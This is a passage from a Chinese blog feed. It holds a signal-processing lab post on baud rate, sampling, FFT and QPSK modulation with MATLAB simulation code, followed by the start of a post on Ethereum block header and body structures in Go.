<br>例如，波特率为 600Bd，则在二进制时，比特率也为 600bit/s；在四进制时，由于 lb4=2，所以比特率为 1200bit/s。可见，在一个码元中可以传送多个比特。</p><h2 id="数据传输率"><a href="#数据传输率" class="headerlink" title="数据传输率"></a>数据传输率</h2><p>数据传输率(data transfer rate)又称数据传输速率、数据传送率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的字符个数</strong>；或者单位时间(每秒)内传输的码组(字块)数或比特数。其单位是字符/秒；或者码组/秒、比特/秒(可见，当数据传输率用“bit/s”作单位时，即等于比特率)。 <strong>所以它的单位在不同的应用中是不同的。</strong>　<br>　例如，在某计算机异步串行通信系统中，数据传输率为 960 字符/s，每个字符包括 1 个起始位、8 个数据位、1 个停止位，则对应的比特率为 10×960 位/s=9600 位/s=9600bit/s；因为是二进制编码，所以对应的波特率也为 9600Bd。<strong>可见，在我们平时用的串口通信中，波特率是 9600Bd，其实比特率也是 9600bps，因为默认就是 2 进制，波特率和比特率就是 M 进制的差别。</strong></p><h2 id="采样频率-fs"><a href="#采样频率-fs" class="headerlink" title="采样频率 fs"></a>采样频率 fs</h2><p>定义：<strong>每秒从连续信号中提取并组成离散信号的采样个数。</strong><br>采样次数 Ns，每个码元被采样的次数，必须为 2 的幂。<br>fs=fb*Ns<br>其中 fb 为波特率，每秒能传输的二进制位数。</p><blockquote><p>实际中，要处理的为模拟信号，想要在数字系统中处理必须为数字信号，即采用抽样、量化、编码的处理方案。<br>处理的第一步为<strong>抽样</strong>，即模数转换。以电话为例，每秒 3000 次取样，每个取样是 7 比特，那么电话的比特率是 21000。而 CD 是每秒 44100 次取样，两个声道，每个取样是 13 位 PCM 编码，所以 CD 的比特率是 44100_2_13=1146600，这个参数也被称为数据带宽，它和 ADSL 中的带宽是一个概念。将码率除以 8,就可以得到这个它的数据速率，1146600/8=143325，也就是说 CD 每秒的数据量大约是 144KB，而一张 CD 的容量是 74 分等于 4440 秒，就是 639360KB ＝ 640MB。即刚好为一张 cd 的容量。</p></blockquote><h2 id="快速傅里叶变换-FFT"><a href="#快速傅里叶变换-FFT" class="headerlink" title="快速傅里叶变换 FFT"></a>快速傅里叶变换 FFT</h2><p>做 n 个点的 FFT，表示在时域上对原来的信号取了 n 个点来做频谱分析，n 点 FFT 变换的结果仍为 n 个点。<br>换句话说，就是将 2pi 数字频率 w 分成 n 份，而整个数字频率 w 的范围覆盖了从 0-2pi*fs 的模拟频率范围。这里的 fs 是<strong>采样频率</strong>。根据<strong>奈科斯特定律</strong>，只有 f=fs/2 范围内的信号才是被采样到的有效信号。<br>举例说，如果做了 16 个点的 FFT 分析，你原来的模拟信号的最高频率 f=32kHz，采样频率是 64kHz，n 的范围是 0,1,2…15。（注：这意味着已经将原来的模拟信号采样了 8 遍。）这时，64kHz 的模拟频率被分成了 16 分，每一份是 4kHz，这个叫<strong>频率分辨率</strong>（卢注：做 FFT 用的点越多，频率分辨率越高）。那么在横坐标中，n=1 时对应的 f 是 4kHz, n=2 对应的是 8kHz, n=15 时对应的是 60kHz，你的频谱是关于 n=8 对称的。你只需要关心 n=0 到 7 以内的频谱就足够了，因为，原来信号的最高模拟频率是 32kHz。<br><a href="https://blog.csdn.net/weixin_39591031/article/details/110392352">https://blog.csdn.net/weixin_39591031/article/details/110392352</a></p><h2 id="QPSK"><a href="#QPSK" class="headerlink" title="QPSK"></a>QPSK</h2><p>QPSK 又叫<strong>四相绝对相移调制（4PSK）</strong>，QPSK 利用载波的四种不同相位来表征数字信息。它的频带利用率高，是 BPSK(二相相移键控）的 2 倍。当数据码元速率相同时，QPSK 信号的传输波特率为 BPSK 信号的传输波特率的一半，所以 QPSK 的传输带宽是 BPSK 信号的一半。QPSK 调制技术的抗干扰能力强，采用相干检测时其误码性能与 BPSK 相同，故得到广泛应用。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-1.png#clientId=u6d886849-8a59-4&from=paste&height=86&id=u40231118&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=922&originalType=binary&size=45922&status=done&style=none&taskId=u80ca2014-1869-4d49-b7f8-d1456c86125&width=461" alt="image.png"><br>写成正交形式：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-2.png#clientId=u6d886849-8a59-4&from=paste&height=149&id=u0c5731d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=297&originWidth=1117&originalType=binary&size=83630&status=done&style=none&taskId=u3fd5ace3-945e-4eac-bc13-dac014e29e4&width=558.5" alt="image.png"><br>QPSK 调制是利用载波的 4 种不同相位来表征数字信息。每一种载波相位代表两个比特的信息。例如，若输入二进制数字信息，序列为 10011100，…，则应该先将其进行分组，每两个比特编为一组。可将它们分为 10，01，11，00 等，然后分别用四种不同的相位来表示。故每个四进制码元又称为双比特码元。把组成双比特码元的前一个信息比特用 a 表示，后一个信息比特用 b 表示。双比特码元中两个信息比特 ab 与载波相位的矢量关系如图 1 所示。图（a）表示 A 方式时 QPSK 信号矢量图，图（b）表示 B 方式时 QPSK 信号的矢量图。由于正弦和余弦的互补特性，对于载波相位的四种取值，在 A 方式中：0°、90°、180°、270°，则数据通过处理后输岀的成形波形幅度有三种取值；B 方式中：45°、135°、225°、315°，则数据通过处理后输出的成形波形幅度有两种取值。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-3.png#clientId=u6d886849-8a59-4&from=paste&height=115&id=u633a436c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=230&originWidth=750&originalType=binary&size=26531&status=done&style=none&taskId=u44ca49f7-2450-4bb0-841f-6fa8556732d&width=375" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-4.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=uce77a3fe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=446&originalType=binary&size=14966&status=done&style=none&taskId=u3c682ff6-2ff7-415e-b46c-5a165526cd4&width=446" alt="image.png"><br>在本次实验中我们采取 B 方式进行调制。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-5.png#clientId=u6d886849-8a59-4&from=paste&height=242&id=ucdfabb2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=284&originWidth=676&originalType=binary&size=17711&status=done&style=none&taskId=u40e11ebc-b2ee-4601-b62f-71e844d08ee&width=576" alt="image.png"><br>原理图如上。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-6.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u45ba068d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=835&originalType=binary&size=66431&status=done&style=none&taskId=u3a4a4871-452c-400d-847a-470c345f1da&width=417.5" alt="image.png"></p><h2 id="QPSK-的功率谱"><a href="#QPSK-的功率谱" class="headerlink" title="QPSK 的功率谱"></a>QPSK 的功率谱</h2><p>由于 QPSK 信号可被理解为由同相支路和正交支路两路 2PSK 叠加而成，但是载波的幅度与码元速率不同，因此 QPSK 信号的功率谱密度相当于 2PSK 信号的功率谱密度的线性叠加：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-7.png#clientId=u6d886849-8a59-4&from=paste&height=49&id=u60898145&margin=%5Bobject%20Object%5D&name=image.png&originHeight=98&originWidth=663&originalType=binary&size=21889&status=done&style=none&taskId=u7f7c99c7-14ab-4639-a548-05a3d1a2b02&width=331.5" alt="image.png"><br>因此 QPSK 信号的功率谱示意图如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-8.png#clientId=u6d886849-8a59-4&from=paste&height=147&id=u8a6de52d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=737&originalType=binary&size=35568&status=done&style=none&taskId=u57056394-5a0d-4c56-a71b-f833cbdb882&width=368.5" alt="image.png"><br>由上图可以看出其带宽等于基带码元速率，峰值频率为等于载波频率。</p><h2 id="星座图的基本概念"><a href="#星座图的基本概念" class="headerlink" title="星座图的基本概念"></a>星座图的基本概念</h2><p>在数字通信领域中，经常将数字信号在复平面上表示，以直观的表示信号以及信号之间的关系，这种图示就是星座图。星座图可以看成数字信号的一个“二维眼图”阵列，同时符号在图中所处的位置具有合理的限制或判决边界。如果要将数字信号发送出去，一般不会直接发 0 或 1，而是先将 0,1 信号（bit）按照一个或者几个组成一组，比如每两个 bit 组成一组，即有 00,01,10,11，总共四种状态，此时可以选择 QPSK 调制，QPSK 四个点组成一个 QPSK 的星座图，每个点与相邻的点相差 90 度（幅度是相同的），一个星座点对应一个调制符号。星座图的作用主要是在调制时用于映射，而接收时用于判断发送的到底是哪个点，从而正确解调数据。</p><h1 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h1><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">clear all;clc;</span><br><span class="line"><span class="comment">%% 生成伪随机码</span></span><br><span class="line"></span><br><span class="line">len = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">orderNum = <span class="number">6</span>;<span class="comment">%m序列为6阶</span></span><br><span class="line"></span><br><span class="line">xulie = idinput((<span class="number">2</span>^orderNum<span class="number">-1</span>),<span class="string">&#x27;prbs&#x27;</span>);<span class="comment">% 生成伪随机序列,长度为63</span></span><br><span class="line"></span><br><span class="line">fb = <span class="number">10</span>; <span class="comment">% 波特率10kHz ,比特率值=波特率值,每秒能传输的二进制位数</span></span><br><span class="line"></span><br><span class="line">Ns = <span class="number">64</span>; <span class="comment">% 采样次数</span></span><br><span class="line"></span><br><span class="line">fs=fb*Ns; <span class="comment">% 采样频率,每秒从连续信号中提取并组成离散信号的采样个数</span></span><br><span class="line"></span><br><span class="line">fc = fb; <span class="comment">%载波频率=比特率</span></span><br><span class="line"></span><br><span class="line">dt=<span class="number">1</span>/fs; <span class="comment">% 采样时间,又称时域采样间隔</span></span><br><span class="line"></span><br><span class="line">Ts = dt;</span><br><span class="line"></span><br><span class="line">N = Ns*<span class="built_in">length</span>(xulie); <span class="comment">% 总采样点个数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">%% 生成两路调制信号</span></span><br><span class="line"></span><br><span class="line">I_carrier = <span class="built_in">zeros</span>(<span class="number">1</span>,N);</span><br><span class="line">Q_carrier = <span class="built_in">zeros</span>(<span class="number">1</span>,N);</span><br><span class="line">I = <span class="built_in">zeros</span>(<span class="number">1</span>,N);</span><br><span class="line">Q = <span class="built_in">zeros</span>(<span class="number">1</span>,N);</span><br><span class="line"></span><br><span class="line"><span class="comment">%采用绘图比较I、Q比特流</span></span><br><span class="line">bit_data=<span class="built_in">zeros</span>(<span class="number">1</span>,N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:len<span class="number">-1</span></span><br><span class="line">    bit_data(Ns*(<span class="built_in">i</span><span class="number">-1</span>)+<span class="number">1</span>:Ns*<span class="built_in">i</span>)=xulie(<span class="built_in">i</span>);<span class="comment">%在一个比特周期里面有Fs个1和采样点一模一样</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%对奇数抽样</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:len/<span class="number">2</span></span><br><span class="line">    I(<span class="number">2</span>*Ns*(<span class="built_in">i</span><span class="number">-1</span>)+<span class="number">1</span>:<span class="number">2</span>*Ns*<span class="built_in">i</span>) = xulie(<span class="number">2</span>*<span class="built_in">i</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">%对偶数采样</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:len/<span class="number">2</span><span class="number">-1</span></span><br><span class="line">    Q(<span class="number">2</span>*Ns*(<span class="built_in">i</span><span class="number">-1</span>)+<span class="number">1</span>:<span class="number">2</span>*Ns*<span class="built_in">i</span>) = xulie(<span class="number">2</span>*<span class="built_in">i</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:N</span><br><span class="line">    I_carrier(<span class="built_in">i</span>) = <span class="built_in">cos</span>(<span class="number">2</span>*<span class="built_in">pi</span>*fc*(<span class="built_in">i</span><span class="number">-1</span>)/(fs));</span><br><span class="line">    Q_carrier(<span class="built_in">i</span>) = -<span class="built_in">sin</span>(<span class="number">2</span>*<span class="built_in">pi</span>*fc*(<span class="built_in">i</span><span class="number">-1</span>)/(fs));</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">%补充采样（最后一个采样点）</span></span><br><span class="line">I_carrier = [I_carrier,<span class="built_in">ones</span>(<span class="number">1</span>,<span class="number">64</span>)*<span class="built_in">cos</span>(<span class="number">2</span>*<span class="built_in">pi</span>*fc*(<span class="built_in">i</span><span class="number">-1</span>)/(fs))];</span><br><span class="line">Q_carrier = [Q_carrier,<span class="built_in">zeros</span>(<span class="number">1</span>,<span class="number">64</span>)];</span><br><span class="line">Q = [Q,<span class="built_in">zeros</span>(<span class="number">1</span>,<span class="number">64</span>)];</span><br><span class="line"></span><br><span class="line">T = N*dt*fb; <span class="comment">% 截断时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%绘图</span></span><br><span class="line"><span class="built_in">figure</span>();</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">plot</span>(bit_data,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;Bitstream&#x27;</span>)<span class="comment">%比特信息</span></span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">plot</span>(I,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;I Bitstream&#x27;</span>)<span class="comment">%I路信息</span></span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">plot</span>(Q,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;Q Bitstream&#x27;</span>)<span class="comment">%Q路信息</span></span><br><span class="line"><span class="comment">%% 调制</span></span><br><span class="line"></span><br><span class="line">I_data = I.*I_carrier;</span><br><span class="line">Q_data = Q.*Q_carrier;</span><br><span class="line">QPSK_data = (I_data + Q_data)/<span class="built_in">sqrt</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">figure</span>();<span class="comment">%产生一个新图</span></span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">plot</span>(I_data,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;I signal&#x27;</span>)<span class="comment">%I路信号</span></span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">plot</span>(Q_data,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;Q signal&#x27;</span>)<span class="comment">%Q路信号</span></span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">plot</span>(QPSK_data,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>]);<span class="built_in">legend</span>(<span class="string">&#x27;QPSK signal&#x27;</span>)<span class="comment">%QPSK信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%% 频谱</span></span><br><span class="line">Bs =fs/<span class="number">2</span>; <span class="comment">% 系统带宽</span></span><br><span class="line">QPSK = <span class="built_in">abs</span>(fftshift(fft(QPSK_data,N)));</span><br><span class="line">ff = <span class="built_in">linspace</span>(-Bs,Bs,N); <span class="comment">% 频域横坐标</span></span><br><span class="line"><span class="built_in">figure</span>()</span><br><span class="line"><span class="built_in">plot</span>(ff,QPSK,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>])</span><br><span class="line"><span class="comment">%axis([-50,50,0,60]);</span></span><br><span class="line">title(<span class="string">&#x27;QPSK调制信号频谱图&#x27;</span>);</span><br><span class="line">xlabel(<span class="string">&#x27;f/kHz&#x27;</span>);</span><br><span class="line">ylabel(<span class="string">&#x27;频谱&#x27;</span>);</span><br><span class="line"><span class="comment">%% 功率谱密度</span></span><br><span class="line">Bs =fs/<span class="number">2</span>; <span class="comment">% 系统带宽</span></span><br><span class="line">QPSK = <span class="number">10</span>*<span class="built_in">log10</span>(<span class="built_in">abs</span>(fftshift(fft(QPSK_data,N))).^<span class="number">2</span>/T);</span><br><span class="line">ff = <span class="built_in">linspace</span>(-Bs,Bs,N); <span class="comment">% 频域横坐标</span></span><br><span class="line"><span class="built_in">figure</span>()</span><br><span class="line"><span class="built_in">plot</span>(ff,QPSK,<span class="string">&#x27;color&#x27;</span>,[<span class="number">55</span>/<span class="number">255</span> <span class="number">108</span>/<span class="number">255</span> <span class="number">176</span>/<span class="number">255</span>])</span><br><span class="line">axis([<span class="number">-50</span>,<span class="number">50</span>,<span class="number">0</span>,<span class="number">60</span>]);</span><br><span class="line">title(<span class="string">&#x27;QPSK调制信号功率谱图&#x27;</span>);</span><br><span class="line">xlabel(<span class="string">&#x27;f/kHz&#x27;</span>);</span><br><span class="line">ylabel(<span class="string">&#x27;功率谱密度/db&#x27;</span>);</span><br><span class="line"><span class="comment">%% 绘制星座图</span></span><br><span class="line"></span><br><span class="line">signal = <span class="built_in">cat</span>(<span class="number">2</span>, I&#x27;, Q&#x27;);         <span class="comment">% 将两路串行信号码元合并在一个length(xulie)*2的矩阵中</span></span><br><span class="line"></span><br><span class="line">[a1,~]=<span class="built_in">find</span>(signal(:,<span class="number">1</span>)==<span class="number">-1</span>&amp;signal(:,<span class="number">2</span>)==<span class="number">-1</span>);       <span class="comment">% 返回满足条件的矩阵元素对应的坐标</span></span><br><span class="line"></span><br><span class="line">xinzuotu(a1)=<span class="number">-1</span><span class="number">-1</span><span class="built_in">i</span>;</span><br><span class="line"></span><br><span class="line">[a2,~]=<span class="built_in">find</span>(signal(:,<span class="number">1</span>)==<span class="number">-1</span>&amp;signal(:,<span class="number">2</span>)==<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">xinzuotu(a2)=<span class="number">-1</span>+<span class="number">1</span><span class="built_in">i</span>;</span><br><span class="line"></span><br><span class="line">[a3,~]=<span class="built_in">find</span>(signal(:,<span class="number">1</span>)==<span class="number">1</span>&amp;signal(:,<span class="number">2</span>)==<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">xinzuotu(a3)=<span class="number">1</span><span class="number">-1</span><span class="built_in">i</span>;</span><br><span class="line"></span><br><span class="line">[a4,~]=<span class="built_in">find</span>(signal(:,<span class="number">1</span>)==<span class="number">1</span>&amp;signal(:,<span class="number">2</span>)==<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">xinzuotu(a4)=<span class="number">1</span>+<span class="number">1</span><span class="built_in">i</span>;</span><br><span class="line"></span><br><span class="line">scatterplot(xinzuotu)  <span class="comment">% 以散点图的形式画出星座图</span></span><br><span class="line"></span><br><span class="line">axis([<span class="number">-2</span> <span class="number">2</span> <span class="number">-2</span> <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">title(<span class="string">&#x27;理想情况基带发射星座图&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>基带时域波形图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-9.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u6306bebc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=754&originalType=binary&size=34568&status=done&style=none&taskId=ude058ecc-602d-4822-b0c1-20e41b84afa&width=699" alt="image.png"><br>QPSK 调制信号波形图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-10.png#clientId=u6d886849-8a59-4&from=paste&height=191&id=u18365c2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=746&originalType=binary&size=128005&status=done&style=none&taskId=u5c2a400b-5220-4dcd-ad80-60844de7555&width=679" alt="image.png"><br>QPSK 调制信号功率谱图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-11.png#clientId=u6d886849-8a59-4&from=paste&height=332&id=uc862d20b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=441&originalType=binary&size=51742&status=done&style=none&taskId=u90871b21-cec3-43ae-961b-35634aecd9e&width=441" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;b 测题目，由于学长写的代码有些步骤无法理解，而且代码不优雅，故重写之。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>区块链底层-区块与交易</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93_new/</id>
    <published>2021-04-24T07:32:07.000Z</published>
    <updated>2021-06-21T06:38:26.966Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="全局结构"><a href="#全局结构" class="headerlink" title="全局结构"></a>全局结构</h1><p>下图是以太坊区块数据结构与关系。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-1.png#clientId=u9ae9216b-af72-4&from=paste&height=402&id=u321a8f97&margin=%5Bobject%20Object%5D&originHeight=644&originWidth=1228&originalType=url&status=done&style=none&taskId=u9f6b4a08-53f6-466b-bd87-bb0cb52dc50&width=766"><br>区块分为两部分：区块头(Header)和区块体(Body)。区块头信息量非常丰富，不但和上一个单元建立联系还记录了一些交易执行情况信息和矿工工作信息。</p><h1 id="定义代码"><a href="#定义代码" class="headerlink" title="定义代码"></a>定义代码</h1><p>下面是以太坊代码中定义的区块头和区块体结构定义代码，所有核心代码均在 core/types/block.go 文件中：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/types/block.go:70</span></span><br><span class="line"><span class="keyword">type</span> Header <span class="keyword">struct</span> &#123;</span><br><span class="line">   ParentHash  common.Hash    <span class="string">`json:&quot;parentHash&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   UncleHash   common.Hash    <span class="string">`json:&quot;sha3Uncles&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   Coinbase    common.Address <span class="string">`json:&quot;miner&quot;            gencodec:&quot;required&quot;`</span></span><br><span class="line">   Root        common.Hash    <span class="string">`json:&quot;stateRoot&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   TxHash      common.Hash    <span class="string">`json:&quot;transactionsRoot&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line">   ReceiptHash common.Hash    <span class="string">`json:&quot;receiptsRoot&quot;     gencodec:&quot;required&quot;`</span></span><br><span class="line">   Bloom       Bloom          <span class="string">`json:&quot;logsBloom&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   Difficulty  *big.Int       <span class="string">`json:&quot;difficulty&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   Number      *big.Int       <span class="string">`json:&quot;number&quot;           gencodec:&quot;required&quot;`</span></span><br><span class="line">   GasLimit    <span class="keyword">uint64</span>         <span class="string">`json:&quot;gasLimit&quot;         gencodec:&quot;required&quot;`</span></span><br><span class="line">   GasUsed     <span class="keyword">uint64</span>         <span class="string">`json:&quot;gasUsed&quot;          gencodec:&quot;required&quot;`</span></span><br><span class="line">   Time        <span class="keyword">uint64</span>         <span class="string">`json:&quot;timestamp&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   Extra       []<span class="keyword">byte</span>         <span class="string">`json:&quot;extraData&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   MixDigest   common.Hash    <span class="string">`json:&quot;mixHash&quot;`</span></span><br><span class="line">   Nonce       BlockNonce     <span class="string">`json:&quot;nonce&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Body <span class="keyword">struct</span> &#123;</span><br><span class="line">Transactions []*Transaction</span><br><span class="line">Uncles       []*Header</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h3 id="parentHash"><a href="#parentHash" class="headerlink" title="parentHash"></a>parentHash</h3><p>是一个哈希值，记录此区块直接引用的父区块哈希值。通过此记录，才能完整的将区块有序组织，形成一条区块链。并且可以防止父区块内容被修改，因为数据修改，区块哈希必然发生变化，因此一个区块直接或间接的强化了所有父辈区块，通过加密算法保证历史区块不可能被修改。</p><h3 id="miner"><a href="#miner" class="headerlink" title="miner"></a>miner</h3><p>是一个地址，表示区块是此账户的矿工挖出，挖矿奖励将下发到此账户。</p><h3 id="transactionsRoot"><a href="#transactionsRoot" class="headerlink" title="transactionsRoot"></a>transactionsRoot</h3><p>是一个哈希值，表示该区块中所有交易生成一颗默克尔树根节点哈希值。是一个密码学保证交易集合摘要。通过此 Root 可以直接校验某交易是否包含在此区块中。</p><h3 id="mixHash"><a href="#mixHash" class="headerlink" title="mixHash"></a>mixHash</h3><p>是一个哈希值。用于校验区块是否正确挖出。实际上是区块头数据不包含 nonce 时的一个哈希值。</p><h1 id="区块体"><a href="#区块体" class="headerlink" title="区块体"></a>区块体</h1><p>区块体 Body 中只有两项数据：<a href="https://learnblockchain.cn/books/geth/part1/transaction.html">交易</a>集合和叔辈区块头集合。是交易促使以太坊世界态进行转变。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-2.png#clientId=u9ae9216b-af72-4&from=paste&height=203&id=u42b0fbbe&margin=%5Bobject%20Object%5D&originHeight=283&originWidth=969&originalType=url&status=done&style=none&taskId=u56a01b4b-366c-4bd6-976c-05606cea4e0&width=693.5"><br>从创世状态开始，每一个区块中的交易执行促使了以太坊世界态的转变。下一个状态是在上一个状态中执行交易或其他操作使得状态由 A 状态转变为 B 状态。<br>而交易则为状态转变的催化酶，<strong>一个区块中的所有交易执行完成后，将使得以太坊进入一个新的状态。</strong>状态转变过程中记录了一些起始变量和结果数据，分别是交易默克尔哈希值<strong>transactionsRoot</strong>、交易回执默克尔哈希值** receiptRoot<strong>、事件布隆值</strong>logsBloom<strong>、新状态的默克尔哈希值</strong>stateRoot**。</p><h1 id="交易回执"><a href="#交易回执" class="headerlink" title="交易回执"></a>交易回执</h1><p>在以太坊中一份交易回执记录了关于此笔交易的处理结果信息：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-3.png#clientId=u9ae9216b-af72-4&from=paste&height=380&id=u3f9ff1a7&margin=%5Bobject%20Object%5D&originHeight=760&originWidth=652&originalType=url&status=done&style=none&taskId=u8eec5c7d-8f2e-41d5-9917-91e25564eb4&width=326"><br>回执信息分为三部分：共识信息、交易信息、区块信息。下面分别介绍各类信息。<br><img src= "/img/loading.gif" 